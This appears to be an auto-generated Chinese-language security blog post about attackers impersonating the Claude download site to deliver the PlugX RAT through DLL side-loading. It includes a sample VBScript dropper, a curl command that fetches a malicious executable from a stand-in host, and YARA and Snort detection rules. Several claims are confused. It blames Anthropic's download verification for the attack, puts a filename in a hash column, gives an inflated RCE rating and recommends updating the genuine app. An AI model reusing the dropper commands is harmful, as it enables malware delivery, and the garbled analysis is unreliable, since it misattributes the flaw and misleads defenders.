---
layout: post
title:  "攻擊者仿冒Claude下載網站散布遠端存取木馬PlugX"
date:   2026-04-14 07:22:39 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Anthropic Claude DLL 側載攻擊：技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: DLL 側載、VBScript Dropper、PlugX RAT

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用了 Anthropic Claude 的下載過程中，沒有對下載檔案進行充分的驗證，從而允許惡意檔案被下載並執行。
* **攻擊流程圖解**: 
  1. 用戶訪問假的 Anthropic Claude 官網。
  2. 下載名為 `Claude-Pro-windows-x64.zip` 的壓縮檔。
  3. 壓縮檔包含 MSI 安裝檔，安裝後會在 `C:\Program Files (x86)\Anthropic\Claude\Cluade\` 資料夾中建立假的捷徑 `Claude AI.lnk`。
  4. 假捷徑指向隱藏在暫存資料夾 (`SquirrelTemp`) 裡的 `Claude.vbs` 腳本。
  5. 腳本執行後，下載並安裝正版的 Anthropic Claude 應用程式，並在背景偷偷執行側載，釋放惡意 DLL 檔案，載入 PlugX RAT。
* **受影響元件**: Anthropic Claude 應用程式，特別是使用了下載和安裝過程中沒有充分驗證的版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶需要訪問假的 Anthropic Claude 官網，並下載並執行假的安裝檔。
* **Payload 建構邏輯**:

    ```
    
    vb
        ' Claude.vbs 腳本範例
        Dim objShell
        Set objShell = WScript.CreateObject("WScript.Shell")
        objShell.Run "cmd /c start """" ""C:\Program Files (x86)\Anthropic\Claude\Cluade\Claude.exe""", 0, False
        ' 執行正版 Anthropic Claude 應用程式
        objShell.Run "cmd /c start """" ""C:\Program Files (x86)\Anthropic\Claude\Cluade\NOVUpdate.exe""", 0, False
        ' 執行惡意 DLL 檔案
    
    ```
 

```

bash
    # 範例指令：使用 curl 下載惡意 DLL 檔案
    curl -o C:\Program Files (x86)\Anthropic\Claude\Cluade\NOVUpdate.exe http://example.com/NOVUpdate.exe

```
* **繞過技術**: 攻擊者使用了 VBScript Dropper 來下載和執行惡意 DLL 檔案，同時使用了正版 Anthropic Claude 應用程式來隱藏惡意行為。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `NOVUpdate.exe` | `8.217.190.58` | `example.com` | `C:\Program Files (x86)\Anthropic\Claude\Cluade\` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
        rule Anthropic_Claude_Malware {
          meta:
            description = "Detects Anthropic Claude malware"
            author = "Your Name"
          strings:
            $a = "NOVUpdate.exe"
            $b = "Claude.vbs"
          condition:
            any of them
        }
    
    ```
 

```

snort
    alert tcp any any -> any 80 (msg:"Anthropic Claude malware detected"; content:"NOVUpdate.exe"; sid:1000001;)

```
* **緩解措施**: 
  1. 更新 Anthropic Claude 應用程式到最新版本。
  2. 刪除假的捷徑 `Claude AI.lnk` 和相關檔案。
  3. 使用防火牆和入侵偵測系統來監控和阻止惡意流量。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DLL 側載 (DLL Side-Loading)**: 想像兩個 DLL 檔案同時被載入到記憶體中，其中一個是惡意的。技術上是指惡意 DLL 檔案被載入到應用程式中，從而執行惡意代碼。
* **VBScript Dropper**: 一種使用 VBScript 腳本來下載和執行惡意檔案的技術。
* **PlugX RAT (Remote Access Trojan)**: 一種遠端存取木馬，允許攻擊者遠端控制受感染的系統。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/175039)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


